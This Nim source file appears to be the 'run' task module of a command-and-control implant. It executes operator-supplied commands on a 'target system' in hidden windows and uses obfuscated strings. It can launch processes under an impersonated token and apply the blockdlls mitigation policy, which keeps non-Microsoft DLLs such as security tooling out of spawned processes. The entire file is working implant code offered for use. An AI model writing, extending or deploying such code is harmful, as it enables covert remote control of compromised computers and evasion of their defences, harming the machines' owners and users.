import json
import ../utils/strenc
import ../global_data

when defined(windows):
  import winim/lean
  import token_manager
  
  const
    EXTENDED_STARTUPINFO_PRESENT_RUN = 0x00080000'u32
    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_RUN = 0x00020007
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_RUN = 0x100000000000'u64
  
  type
    PROC_THREAD_ATTRIBUTE_LIST_RUN = object
    LPPROC_THREAD_ATTRIBUTE_LIST_RUN = ptr PROC_THREAD_ATTRIBUTE_LIST_RUN
    
    STARTUPINFOEXA_RUN = object
      StartupInfo: STARTUPINFOA
      lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_RUN
  
  proc InitializeProcThreadAttributeListRun(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_RUN, 
                                            dwAttributeCount: DWORD, dwFlags: DWORD, 
                                            lpSize: ptr SIZE_T): WINBOOL
    {.importc: "InitializeProcThreadAttributeList", dynlib: "kernel32.dll", stdcall.}
  
  proc UpdateProcThreadAttributeRun(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_RUN,
                                    dwFlags: DWORD, Attribute: DWORD_PTR, 
                                    lpValue: PVOID, cbSize: SIZE_T,
                                    lpPreviousValue: PVOID, lpReturnSize: ptr SIZE_T): WINBOOL
    {.importc: "UpdateProcThreadAttribute", dynlib: "kernel32.dll", stdcall.}
  
  proc DeleteProcThreadAttributeListRun(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_RUN): void
    {.importc: "DeleteProcThreadAttributeList", dynlib: "kernel32.dll", stdcall.}

else:
  import osproc

type
  RunArgs = object
    executable: string
    arguments: string

proc run*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a binary on the target system
  try:
    let args = to(params, RunArgs)
    
    if args.executable.len == 0:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Executable path cannot be empty")
      }
    
    when defined(windows):
      var
        si: STARTUPINFOA
        pi: PROCESS_INFORMATION
        commandLine: string
      
      si.cb = sizeof(STARTUPINFOA).DWORD
      si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
      si.wShowWindow = SW_HIDE
      
      # Build command line - handle "default" case for shell alias
      if args.executable == obf("default"):
        # When called from shell command, arguments contains the actual command
        commandLine = obf("cmd.exe /c ") & args.arguments
      elif args.arguments.len > 0:
        commandLine = args.executable & " " & args.arguments
      else:
        commandLine = args.executable
      
      # Create pipes for stdout/stderr
      var
        hStdoutRead, hStdoutWrite: HANDLE
        hStderrRead, hStderrWrite: HANDLE
        sa: SECURITY_ATTRIBUTES
      
      sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
      sa.bInheritHandle = TRUE
      sa.lpSecurityDescriptor = nil
      
      if CreatePipe(addr hStdoutRead, addr hStdoutWrite, addr sa, 0) == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stdout pipe")
        }
      
      if CreatePipe(addr hStderrRead, addr hStderrWrite, addr sa, 0) == 0:
        CloseHandle(hStdoutRead)
        CloseHandle(hStdoutWrite)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stderr pipe")
        }
      
      # Make sure read handles are not inherited
      discard SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0)
      discard SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0)
      
      si.hStdOutput = hStdoutWrite
      si.hStdError = hStderrWrite
      si.hStdInput = GetStdHandle(STD_INPUT_HANDLE)
      
      # Check if we have an impersonation token
      let tokenHandle = getTokenHandle()
      let blockDlls = getBlockDlls()
      var createResult: WINBOOL
      
      if tokenHandle != 0:
        # We have an impersonation token - try CreateProcessWithTokenW
        # Note: CreateProcessWithTokenW does not support STARTUPINFOEX,
        # so blockdlls cannot be applied with impersonated tokens
        var commandLineW = newWideCString(commandLine)
        
        # Create STARTUPINFOW for the wide-char version
        var siW: STARTUPINFOW
        siW.cb = sizeof(STARTUPINFOW).DWORD
        siW.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
        siW.wShowWindow = SW_HIDE
        siW.hStdOutput = hStdoutWrite
        siW.hStdError = hStderrWrite
        siW.hStdInput = GetStdHandle(STD_INPUT_HANDLE)
        
        # Try CreateProcessWithTokenW to run as the impersonated user
        createResult = CreateProcessWithTokenW(
          tokenHandle,
          0,  # LOGON_WITH_PROFILE
          nil,
          cast[LPWSTR](commandLineW[0].addr),
          CREATE_NO_WINDOW,
          nil,
          nil,
          addr siW,
          addr pi
        )
        
        # If it fails with ACCESS_DENIED (error 5), fall back to CreateProcessA
        # CreateProcessWithTokenW requires SE_IMPERSONATE_NAME privilege which regular users don't have
        if createResult == 0 and GetLastError() == 5:
          if blockDlls:
            # Use extended startup info with blockdlls mitigation
            var mitigationPolicy: uint64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_RUN
            var size: SIZE_T = 0
            discard InitializeProcThreadAttributeListRun(nil, 1, 0, addr size)
            var attrList = newSeq[byte](size)
            let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST_RUN](addr attrList[0])
            
            if InitializeProcThreadAttributeListRun(attrListPtr, 1, 0, addr size) != 0:
              discard UpdateProcThreadAttributeRun(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_RUN,
                                                   addr mitigationPolicy, SIZE_T(sizeof(uint64)), nil, nil)
              
              var siEx: STARTUPINFOEXA_RUN
              siEx.StartupInfo = si
              siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA_RUN).DWORD
              siEx.lpAttributeList = attrListPtr
              
              createResult = CreateProcessA(
                nil,
                addr commandLine[0],
                nil, nil,
                TRUE,
                CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT_RUN,
                nil, nil,
                cast[ptr STARTUPINFOA](addr siEx),
                addr pi
              )
              DeleteProcThreadAttributeListRun(attrListPtr)
            else:
              # Fallback to normal if attribute list init fails
              createResult = CreateProcessA(
                nil, addr commandLine[0], nil, nil,
                TRUE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi
              )
          else:
            createResult = CreateProcessA(
              nil,
              addr commandLine[0],
              nil,
              nil,
              TRUE,  # Inherit handles
              CREATE_NO_WINDOW,
              nil,
              nil,
              addr si,
              addr pi
            )
      elif blockDlls:
        # No token, but blockdlls enabled - use extended startup info
        var mitigationPolicy: uint64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_RUN
        var size: SIZE_T = 0
        discard InitializeProcThreadAttributeListRun(nil, 1, 0, addr size)
        var attrList = newSeq[byte](size)
        let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST_RUN](addr attrList[0])
        
        if InitializeProcThreadAttributeListRun(attrListPtr, 1, 0, addr size) != 0:
          discard UpdateProcThreadAttributeRun(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_RUN,
                                               addr mitigationPolicy, SIZE_T(sizeof(uint64)), nil, nil)
          
          var siEx: STARTUPINFOEXA_RUN
          siEx.StartupInfo = si
          siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA_RUN).DWORD
          siEx.lpAttributeList = attrListPtr
          
          createResult = CreateProcessA(
            nil,
            addr commandLine[0],
            nil, nil,
            TRUE,
            CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT_RUN,
            nil, nil,
            cast[ptr STARTUPINFOA](addr siEx),
            addr pi
          )
          DeleteProcThreadAttributeListRun(attrListPtr)
        else:
          # Fallback to normal if attribute list init fails
          createResult = CreateProcessA(
            nil, addr commandLine[0], nil, nil,
            TRUE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi
          )
      else:
        # No impersonation token, no blockdlls - use normal CreateProcessA
        createResult = CreateProcessA(
          nil,
          addr commandLine[0],
          nil,
          nil,
          TRUE,  # Inherit handles
          CREATE_NO_WINDOW,
          nil,
          nil,
          addr si,
          addr pi
        )
      
      # Close write ends of pipes
      CloseHandle(hStdoutWrite)
      CloseHandle(hStderrWrite)
      
      if createResult == 0:
        let errorCode = GetLastError()
        CloseHandle(hStdoutRead)
        CloseHandle(hStderrRead)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create process. Error code: ") & $errorCode
        }
      
      # Read output
      var output = ""
      var buffer: array[4096, char]
      var bytesRead: DWORD
      
      while ReadFile(hStdoutRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          output.add(buffer[i])
      
      # Read stderr
      var errors = ""
      while ReadFile(hStderrRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          errors.add(buffer[i])
      
      # Wait for process to complete
      discard WaitForSingleObject(pi.hProcess, INFINITE)
      
      var exitCode: DWORD
      discard GetExitCodeProcess(pi.hProcess, addr exitCode)
      
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      CloseHandle(hStdoutRead)
      CloseHandle(hStderrRead)
      
      var finalOutput = ""
      if output.len > 0:
        finalOutput.add(output)
      if errors.len > 0:
        if finalOutput.len > 0:
          finalOutput.add("\n")
        finalOutput.add(errors)
      
      if finalOutput.len == 0:
        finalOutput = obf("(No output)")
      
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): if exitCode == 0: obf("success") else: "error",
        obf("user_output"): finalOutput
      }
    else:
      # Unix-like systems
      var cmd = args.executable
      if args.arguments.len > 0:
        cmd &= " " & args.arguments
      
      let (output, exitCode) = execCmdEx(cmd)
      
      var finalOutput = obf("Process executed successfully\n")
      finalOutput.add(obf("Command: ") & cmd & "\n")
      finalOutput.add(obf("Exit code: ") & $exitCode & "\n")
      if output.len > 0:
        finalOutput.add(obf("\n=== Output ===\n") & output & obf("\n==============\n"))
      
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): obf("success"),
        obf("user_output"): finalOutput
      }
      
  except Exception as e:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("Failed to execute process: ") & e.msg
    }
